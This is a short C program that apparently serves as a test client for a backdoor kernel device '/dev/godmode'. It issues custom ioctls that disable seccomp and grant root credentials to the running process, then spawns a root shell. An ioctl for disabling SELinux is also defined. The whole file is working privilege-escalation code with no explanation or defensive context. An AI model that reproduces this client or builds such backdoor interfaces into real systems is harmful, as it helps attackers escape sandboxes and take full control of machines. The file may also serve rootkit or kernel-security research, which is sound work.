#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define GOD_MODE_DEV		"/dev/godmode"

#define GODMODE_DISABLE_SECCOMP _IOC(_IOC_WRITE, 'k', 1, 0) 
#define GODMODE_ENABLE_ROOT		_IOC(_IOC_WRITE, 'k', 2, 0)
#define GODMODE_DISABLE_SELINUX	_IOC(_IOC_WRITE, 'k', 3, 0)

int main(int argc, const char **argv)
{
	int dev_fd, ret;

	printf("[!] Run test progr\n");
	printf("[!] My userid is %d\n", getuid());

	dev_fd = open(GOD_MODE_DEV, 0);
	if (dev_fd < 0) {
		printf("[!] Cannot open %s\n", GOD_MODE_DEV);
		return -1;
	}

	ret = ioctl(dev_fd, GODMODE_DISABLE_SECCOMP, 0);
	if (ret < 0) {
		printf("[!] Cannot disable seccomp\n");
		goto teardown;
	}

	printf("[!] Disable seccomp success\n");

	ret = ioctl(dev_fd, GODMODE_ENABLE_ROOT, 0);
	if (ret < 0) {
		printf("[!] Cannot install root creds in this task error:%d\n", ret);
		goto teardown;
	}
	
	printf("[!] My userid is %d\n", getuid());
	if (getuid() == 0) {
		printf("[!] Got root, spawn a shell\n");
		system("/bin/sh &");
	}

teardown:
	close(dev_fd);
	return 0;
}
